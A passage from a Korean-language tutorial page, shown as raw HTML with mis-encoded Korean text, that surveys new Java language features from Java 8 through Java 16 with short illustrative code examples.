class="number">12</span>, <span class="number">25</span>, <span class="number">14</span>, <span class="number">30</span>);</span><br></pre></td></tr></table></figure><h3 id="ì¸í„°í˜ì´ìŠ¤ì˜-Default-ë©”ì„œë“œ"><a href="#ì¸í„°í˜ì´ìŠ¤ì˜-Default-ë©”ì„œë“œ" class="headerlink" title="ì¸í„°í˜ì´ìŠ¤ì˜ Default ë©”ì„œë“œ"></a>ì¸í„°í˜ì´ìŠ¤ì˜ Default ë©”ì„œë“œ</h3><p>ì¸í„°í˜ì´ìŠ¤ì— êµ¬í˜„ë¶€ë¥¼ ê°€ì§„ ë©”ì„œë“œë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê¸°ì¡´ ì¸í„°í˜ì´ìŠ¤ë¥¼ í™•ì¥í•˜ë©´ì„œë„ í•˜ìœ„ í˜¸í™˜ì„±ì„ ìœ ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Vehicle</span> &#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am a vehicle!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Java-9-2017ë…„-9ì›”"><a href="#Java-9-2017ë…„-9ì›”" class="headerlink" title="Java 9 (2017ë…„ 9ì›”)"></a>Java 9 (2017ë…„ 9ì›”)</h2><p>Java 9ëŠ” ëª¨ë“ˆ ì‹œìŠ¤í…œì´ë¼ëŠ” ëŒ€ê·œëª¨ ë³€í™”ì™€ í•¨ê»˜ ë‹¤ì–‘í•œ í¸ì˜ì„± ê°œì„ ì´ ì´ë£¨ì–´ì§„ ë²„ì „ì…ë‹ˆë‹¤.</p><h3 id="ëª¨ë“ˆ-ì‹œìŠ¤í…œ-Project-Jigsaw"><a href="#ëª¨ë“ˆ-ì‹œìŠ¤í…œ-Project-Jigsaw" class="headerlink" title="ëª¨ë“ˆ ì‹œìŠ¤í…œ (Project Jigsaw)"></a>ëª¨ë“ˆ ì‹œìŠ¤í…œ (Project Jigsaw)</h3><p>ìë°” í”Œë«í¼ì„ ëª¨ë“ˆí™”í•˜ì—¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì˜ì¡´ì„±ì„ ëª…í™•í•˜ê²Œ ê´€ë¦¬í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. module-info.java íŒŒì¼ì„ í†µí•´ ëª¨ë“ˆ ê°„ì˜ ì˜ì¡´ì„±ì„ ì„ ì–¸í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> com.example.myapp &#123;</span><br><span class="line">    <span class="keyword">requires</span> java.sql;</span><br><span class="line">    <span class="keyword">exports</span> com.example.myapp.api;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ì»¬ë ‰ì…˜-íŒ©í† ë¦¬-ë©”ì„œë“œ"><a href="#ì»¬ë ‰ì…˜-íŒ©í† ë¦¬-ë©”ì„œë“œ" class="headerlink" title="ì»¬ë ‰ì…˜ íŒ©í† ë¦¬ ë©”ì„œë“œ"></a>ì»¬ë ‰ì…˜ íŒ©í† ë¦¬ ë©”ì„œë“œ</h3><p>ë¶ˆë³€ ì»¬ë ‰ì…˜ì„ ì‰½ê²Œ ìƒì„±í•  ìˆ˜ ìˆëŠ” íŒ©í† ë¦¬ ë©”ì„œë“œê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. ì½”ë“œê°€ í›¨ì”¬ ê°„ê²°í•´ì§€ê³  ê°€ë…ì„±ì´ í–¥ìƒë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = List.of(<span class="string">&quot;Java&quot;</span>, <span class="string">&quot;Python&quot;</span>, <span class="string">&quot;JavaScript&quot;</span>);</span><br><span class="line">Set&lt;Integer&gt; set = Set.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">Map&lt;String, Integer&gt; map = Map.of(<span class="string">&quot;one&quot;</span>, <span class="number">1</span>, <span class="string">&quot;two&quot;</span>, <span class="number">2</span>, <span class="string">&quot;three&quot;</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><h3 id="ìŠ¤íŠ¸ë¦¼-API-ê°œì„ "><a href="#ìŠ¤íŠ¸ë¦¼-API-ê°œì„ " class="headerlink" title="ìŠ¤íŠ¸ë¦¼ API ê°œì„ "></a>ìŠ¤íŠ¸ë¦¼ API ê°œì„ </h3><p>ìŠ¤íŠ¸ë¦¼ ì²˜ë¦¬ë¥¼ ë” ìœ ì—°í•˜ê²Œ í•  ìˆ˜ ìˆëŠ” ìƒˆë¡œìš´ ë©”ì„œë“œë“¤ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// takeWhile: ì¡°ê±´ì´ ì°¸ì¸ ë™ì•ˆë§Œ ìš”ì†Œë¥¼ ê°€ì ¸ì˜´</span></span><br><span class="line">Stream.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    .takeWhile(n -&gt; n &lt; <span class="number">4</span>)</span><br><span class="line">    .collect(Collectors.toList());</span><br><span class="line"><span class="comment">// ê²°ê³¼: [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dropWhile: ì¡°ê±´ì´ ì°¸ì¸ ë™ì•ˆ ìš”ì†Œë¥¼ ê±´ë„ˆëœ€</span></span><br><span class="line">Stream.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    .dropWhile(n -&gt; n &lt; <span class="number">4</span>)</span><br><span class="line">    .collect(Collectors.toList());</span><br><span class="line"><span class="comment">// ê²°ê³¼: [4, 5, 1, 2]</span></span><br></pre></td></tr></table></figure><h3 id="JShell-REPL"><a href="#JShell-REPL" class="headerlink" title="JShell (REPL)"></a>JShell (REPL)</h3><p>ìë°” ì½”ë“œë¥¼ ëŒ€í™”ì‹ìœ¼ë¡œ ì‹¤í–‰í•˜ê³  í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ê°„ë‹¨í•œ ì½”ë“œ ìŠ¤ë‹ˆí«ì„ ë¹ ë¥´ê²Œ ì‹¤í–‰í•˜ê³  ê²°ê³¼ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ jshell</span><br><span class="line">jshell&gt; int x = 10</span><br><span class="line">x ==&gt; 10</span><br><span class="line">jshell&gt; x * 2</span><br><span class="line"><span class="variable">$2</span> ==&gt; 20</span><br></pre></td></tr></table></figure><hr><h2 id="Java-10-2018ë…„-3ì›”"><a href="#Java-10-2018ë…„-3ì›”" class="headerlink" title="Java 10 (2018ë…„ 3ì›”)"></a>Java 10 (2018ë…„ 3ì›”)</h2><p>Java 10ì€ ë¹„êµì  ì‘ì€ ë³€í™”ê°€ ìˆì—ˆì§€ë§Œ, ê°œë°œì ê²½í—˜ì„ í¬ê²Œ ê°œì„ í•œ ê¸°ëŠ¥ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="ì§€ì—­-ë³€ìˆ˜-íƒ€ì…-ì¶”ë¡ -var"><a href="#ì§€ì—­-ë³€ìˆ˜-íƒ€ì…-ì¶”ë¡ -var" class="headerlink" title="ì§€ì—­ ë³€ìˆ˜ íƒ€ì… ì¶”ë¡  (var)"></a>ì§€ì—­ ë³€ìˆ˜ íƒ€ì… ì¶”ë¡  (var)</h3><p>ë©”ì„œë“œ ë‚´ë¶€ì˜ ì§€ì—­ ë³€ìˆ˜ ì„ ì–¸ ì‹œ íƒ€ì…ì„ ëª…ì‹œí•˜ì§€ ì•Šê³  var í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. ì»´íŒŒì¼ëŸ¬ê°€ ìš°ë³€ì˜ ì´ˆê¸°í™” í‘œí˜„ì‹ì„ í†µí•´ íƒ€ì…ì„ ì¶”ë¡ í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê¸°ì¡´ ë°©ì‹</span></span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">Map&lt;String, List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// var ì‚¬ìš©</span></span><br><span class="line"><span class="type">var</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="type">var</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, List&lt;Integer&gt;&gt;();</span><br><span class="line"><span class="type">var</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John Doe&quot;</span>;  <span class="comment">// Stringìœ¼ë¡œ ì¶”ë¡ ë¨</span></span><br><span class="line"><span class="type">var</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">42</span>;        <span class="comment">// intë¡œ ì¶”ë¡ ë¨</span></span><br></pre></td></tr></table></figure><p>ì£¼ì˜í•  ì ì€ varëŠ” ì§€ì—­ ë³€ìˆ˜ì—ë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, ì´ˆê¸°í™” í‘œí˜„ì‹ì´ ë°˜ë“œì‹œ í•„ìš”í•©ë‹ˆë‹¤.</p><hr><h2 id="Java-11-2018ë…„-9ì›”-LTS"><a href="#Java-11-2018ë…„-9ì›”-LTS" class="headerlink" title="Java 11 (2018ë…„ 9ì›”) - LTS"></a>Java 11 (2018ë…„ 9ì›”) - LTS</h2><p>Java 11ì€ Java 8 ì´í›„ ë‘ ë²ˆì§¸ ì¥ê¸° ì§€ì›(LTS) ë²„ì „ì…ë‹ˆë‹¤. ë§ì€ ê¸°ì—…ë“¤ì´ Java 8ì—ì„œ Java 11ë¡œ ë§ˆì´ê·¸ë ˆì´ì…˜í•˜ë©´ì„œ ë„ë¦¬ ì‚¬ìš©ë˜ê³  ìˆìŠµë‹ˆë‹¤.</p><h3 id="ìƒˆë¡œìš´-String-ë©”ì„œë“œ"><a href="#ìƒˆë¡œìš´-String-ë©”ì„œë“œ" class="headerlink" title="ìƒˆë¡œìš´ String ë©”ì„œë“œ"></a>ìƒˆë¡œìš´ String ë©”ì„œë“œ</h3><p>ë¬¸ìì—´ ì²˜ë¦¬ë¥¼ ë” í¸ë¦¬í•˜ê²Œ í•´ì£¼ëŠ” ë‹¤ì–‘í•œ ë©”ì„œë“œë“¤ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;  Hello World  &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// isBlank(): ê³µë°± ë¬¸ìë§Œ ìˆê±°ë‚˜ ë¹„ì–´ìˆëŠ”ì§€ í™•ì¸</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.isBlank();        <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;  &quot;</span>.isBlank();      <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.isBlank();   <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strip(): ì•ë’¤ ê³µë°± ì œê±° (ìœ ë‹ˆì½”ë“œ ê³µë°± ë¬¸ì ì§€ì›)</span></span><br><span class="line">text.strip();        <span class="comment">// &quot;Hello World&quot;</span></span><br><span class="line">text.stripLeading(); <span class="comment">// &quot;Hello World  &quot;</span></span><br><span class="line">text.stripTrailing();<span class="comment">// &quot;  Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// lines(): ì¤„ ë‹¨ìœ„ë¡œ ìŠ¤íŠ¸ë¦¼ ìƒì„±</span></span><br><span class="line"><span class="string">&quot;Line1\nLine2\nLine3&quot;</span>.lines()</span><br><span class="line">    .forEach(System.out::println);</span><br><span class="line"></span><br><span class="line"><span class="comment">// repeat(): ë¬¸ìì—´ ë°˜ë³µ</span></span><br><span class="line"><span class="string">&quot;Java &quot;</span>.repeat(<span class="number">3</span>);   <span class="comment">// &quot;Java Java Java &quot;</span></span><br></pre></td></tr></table></figure><h3 id="íŒŒì¼-ì²˜ë¦¬-ê°œì„ "><a href="#íŒŒì¼-ì²˜ë¦¬-ê°œì„ " class="headerlink" title="íŒŒì¼ ì²˜ë¦¬ ê°œì„ "></a>íŒŒì¼ ì²˜ë¦¬ ê°œì„ </h3><p>íŒŒì¼ì„ ì½ê³  ì“°ëŠ” ì‘ì—…ì´ í›¨ì”¬ ê°„ë‹¨í•´ì¡ŒìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// íŒŒì¼ ì½ê¸°</span></span><br><span class="line"><span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> Files.readString(Path.of(<span class="string">&quot;file.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// íŒŒì¼ ì“°ê¸°</span></span><br><span class="line">Files.writeString(Path.of(<span class="string">&quot;file.txt&quot;</span>), <span class="string">&quot;Hello World&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="ë‹¨ì¼-íŒŒì¼-ì‹¤í–‰"><a href="#ë‹¨ì¼-íŒŒì¼-ì‹¤í–‰" class="headerlink" title="ë‹¨ì¼ íŒŒì¼ ì‹¤í–‰"></a>ë‹¨ì¼ íŒŒì¼ ì‹¤í–‰</h3><p>javacë¡œ ì»´íŒŒì¼í•˜ì§€ ì•Šê³ ë„ ìë°” íŒŒì¼ì„ ì§ì ‘ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. ìŠ¤í¬ë¦½íŠ¸ì²˜ëŸ¼ ì‚¬ìš©í•  ìˆ˜ ìˆì–´ ê°„ë‹¨í•œ í”„ë¡œê·¸ë¨ì„ ì‘ì„±í•  ë•Œ í¸ë¦¬í•©ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì»´íŒŒì¼ ì—†ì´ ë°”ë¡œ ì‹¤í–‰</span></span><br><span class="line">java HelloWorld.java</span><br></pre></td></tr></table></figure><h3 id="HTTP-Client-API-ì •ì‹-ë²„ì „"><a href="#HTTP-Client-API-ì •ì‹-ë²„ì „" class="headerlink" title="HTTP Client API (ì •ì‹ ë²„ì „)"></a>HTTP Client API (ì •ì‹ ë²„ì „)</h3><p>Java 9ì—ì„œ ì¸íë² ì´í„°ë¡œ ì œê³µë˜ë˜ HTTP Clientê°€ ì •ì‹ ê¸°ëŠ¥ìœ¼ë¡œ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. ë¹„ë™ê¸° ì²˜ë¦¬ì™€ HTTP&#x2F;2ë¥¼ ì§€ì›í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClient.newHttpClient();</span><br><span class="line"><span class="type">HttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> HttpRequest.newBuilder()</span><br><span class="line">    .uri(URI.create(<span class="string">&quot;https://api.example.com/data&quot;</span>))</span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line">HttpResponse&lt;String&gt; response = client.send(request,</span><br><span class="line">    HttpResponse.BodyHandlers.ofString());</span><br><span class="line">System.out.println(response.body());</span><br></pre></td></tr></table></figure><hr><h2 id="Java-12-2019ë…„-3ì›”"><a href="#Java-12-2019ë…„-3ì›”" class="headerlink" title="Java 12 (2019ë…„ 3ì›”)"></a>Java 12 (2019ë…„ 3ì›”)</h2><h3 id="Switch-í‘œí˜„ì‹-Preview"><a href="#Switch-í‘œí˜„ì‹-Preview" class="headerlink" title="Switch í‘œí˜„ì‹ (Preview)"></a>Switch í‘œí˜„ì‹ (Preview)</h3><p>ê¸°ì¡´ì˜ switch ë¬¸ì€ ë¬¸ì¥(statement)ì´ì—ˆì§€ë§Œ, Java 12ë¶€í„°ëŠ” ê°’ì„ ë°˜í™˜í•˜ëŠ” í‘œí˜„ì‹(expression)ìœ¼ë¡œë„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê¸°ì¡´ switch ë¬¸</span></span><br><span class="line">String result;</span><br><span class="line"><span class="keyword">switch</span> (day) &#123;</span><br><span class="line">    <span class="keyword">case</span> MONDAY:</span><br><span class="line">    <span class="keyword">case</span> FRIDAY:</span><br><span class="line">        result = <span class="string">&quot;Working day&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SATURDAY:</span><br><span class="line">    <span class="keyword">case</span> SUNDAY:</span><br><span class="line">        result = <span class="string">&quot;Weekend&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        result = <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ìƒˆë¡œìš´ switch í‘œí˜„ì‹</span></span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">    <span class="keyword">case</span> MONDAY, FRIDAY -&gt; <span class="string">&quot;Working day&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> SATURDAY, SUNDAY -&gt; <span class="string">&quot;Weekend&quot;</span>;</span><br><span class="line">    <span class="keyword">default</span> -&gt; <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="Java-13-2019ë…„-9ì›”"><a href="#Java-13-2019ë…„-9ì›”" class="headerlink" title="Java 13 (2019ë…„ 9ì›”)"></a>Java 13 (2019ë…„ 9ì›”)</h2><h3 id="Text-Blocks-Preview"><a href="#Text-Blocks-Preview" class="headerlink" title="Text Blocks (Preview)"></a>Text Blocks (Preview)</h3><p>ì—¬ëŸ¬ ì¤„ì— ê±¸ì¹œ ë¬¸ìì—´ì„ ì‘ì„±í•  ë•Œ ì´ìŠ¤ì¼€ì´í”„ ë¬¸ì ì—†ì´ ìì—°ìŠ¤ëŸ½ê²Œ í‘œí˜„í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. JSON, HTML, SQL ë“±ì„ ì‘ì„±í•  ë•Œ íŠ¹íˆ ìœ ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê¸°ì¡´ ë°©ì‹</span></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;  \&quot;name\&quot;: \&quot;John\&quot;,\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;  \&quot;age\&quot;: 30\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Text Blocks ì‚¬ìš©</span></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;John&quot;,</span></span><br><span class="line"><span class="string">      &quot;age&quot;: 30</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello World&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="Java-14-2020ë…„-3ì›”"><a href="#Java-14-2020ë…„-3ì›”" class="headerlink" title="Java 14 (2020ë…„ 3ì›”)"></a>Java 14 (2020ë…„ 3ì›”)</h2><h3 id="Records-Preview"><a href="#Records-Preview" class="headerlink" title="Records (Preview)"></a>Records (Preview)</h3><p>ë°ì´í„°ë¥¼ ë‹´ëŠ” ë‹¨ìˆœí•œ í´ë˜ìŠ¤ë¥¼ ì‘ì„±í•  ë•Œ ë³´ì¼ëŸ¬í”Œë ˆì´íŠ¸ ì½”ë“œë¥¼ í¬ê²Œ ì¤„ì¼ ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. getter, equals, hashCode, toString ë©”ì„œë“œê°€ ìë™ìœ¼ë¡œ ìƒì„±ë©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê¸°ì¡´ ë°©ì‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">x</span><span class="params">()</span> &#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">y</span><span class="params">()</span> &#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// equals, hashCode, toString êµ¬í˜„ í•„ìš”...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Record ì‚¬ìš©</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì‚¬ìš© ì˜ˆì‹œ</span></span><br><span class="line"><span class="type">Point</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">System.out.println(p.x());  <span class="comment">// 10</span></span><br><span class="line">System.out.println(p);      <span class="comment">// Point[x=10, y=20]</span></span><br></pre></td></tr></table></figure><h3 id="instanceof-íŒ¨í„´-ë§¤ì¹­-Preview"><a href="#instanceof-íŒ¨í„´-ë§¤ì¹­-Preview" class="headerlink" title="instanceof íŒ¨í„´ ë§¤ì¹­ (Preview)"></a>instanceof íŒ¨í„´ ë§¤ì¹­ (Preview)</h3><p>instanceofë¡œ íƒ€ì…ì„ ì²´í¬í•œ í›„ ìë™ìœ¼ë¡œ ìºìŠ¤íŒ…ì´ ì´ë£¨ì–´ì§€ë„ë¡ ê°œì„ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê¸°ì¡´ ë°©ì‹</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) obj;</span><br><span class="line">    System.out.println(str.length());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// íŒ¨í„´ ë§¤ì¹­ ì‚¬ìš©</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String str) &#123;</span><br><span class="line">    System.out.println(str.length());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ê°œì„ ëœ-NullPointerException-ë©”ì‹œì§€"><a href="#ê°œì„ ëœ-NullPointerException-ë©”ì‹œì§€" class="headerlink" title="ê°œì„ ëœ NullPointerException ë©”ì‹œì§€"></a>ê°œì„ ëœ NullPointerException ë©”ì‹œì§€</h3><p>NullPointerExceptionì´ ë°œìƒí–ˆì„ ë•Œ ì–´ë–¤ ë³€ìˆ˜ê°€ nullì¸ì§€ ì •í™•í•˜ê²Œ ì•Œë ¤ì£¼ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.getAddress().getCity().getName();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ê¸°ì¡´: NullPointerException</span></span><br><span class="line"><span class="comment">// ê°œì„ : Cannot invoke &quot;City.getName()&quot; because the return value of</span></span><br><span class="line"><span class="comment">//       &quot;Address.getCity()&quot; is null</span></span><br></pre></td></tr></table></figure><hr><h2 id="Java-15-2020ë…„-9ì›”"><a href="#Java-15-2020ë…„-9ì›”" class="headerlink" title="Java 15 (2020ë…„ 9ì›”)"></a>Java 15 (2020ë…„ 9ì›”)</h2><h3 id="Text-Blocks-ì •ì‹-ê¸°ëŠ¥"><a href="#Text-Blocks-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="Text Blocks (ì •ì‹ ê¸°ëŠ¥)"></a>Text Blocks (ì •ì‹ ê¸°ëŠ¥)</h3><p>Java 13ì—ì„œ í”„ë¦¬ë·°ë¡œ ì œê³µë˜ë˜ í…ìŠ¤íŠ¸ ë¸”ë¡ì´ ì •ì‹ ê¸°ëŠ¥ìœ¼ë¡œ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="Sealed-Classes-Preview"><a href="#Sealed-Classes-Preview" class="headerlink" title="Sealed Classes (Preview)"></a>Sealed Classes (Preview)</h3><p>í´ë˜ìŠ¤ì˜ ìƒì†ì„ ì œí•œí•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. ì–´ë–¤ í´ë˜ìŠ¤ê°€ ì´ í´ë˜ìŠ¤ë¥¼ ìƒì†í•  ìˆ˜ ìˆëŠ”ì§€ ëª…ì‹œì ìœ¼ë¡œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title class_">Shape</span></span><br><span class="line">    <span class="keyword">permits</span> Circle, Rectangle, Triangle &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Triangle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ë¥¼ í†µí•´ ë„ë©”ì¸ ëª¨ë¸ë§ì„ ë” ëª…í™•í•˜ê²Œ í•  ìˆ˜ ìˆê³ , íŒ¨í„´ ë§¤ì¹­ê³¼ í•¨ê»˜ ì‚¬ìš©í•˜ë©´ ê°•ë ¥í•œ íƒ€ì… ì•ˆì „ì„±ì„ ì œê³µí•©ë‹ˆë‹¤.</p><hr><h2 id="Java-16-2021ë…„-3ì›”"><a href="#Java-16-2021ë…„-3ì›”" class="headerlink" title="Java 16 (2021ë…„ 3ì›”)"></a>Java 16 (2021ë…„ 3ì›”)</h2><h3 id="Records-ì •ì‹-ê¸°ëŠ¥"><a href="#Records-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="Records (ì •ì‹ ê¸°ëŠ¥)"></a>Records (ì •ì‹ ê¸°ëŠ¥)</h3><p>Java 14ì—ì„œ í”„ë¦¬ë·°ë¡œ ì 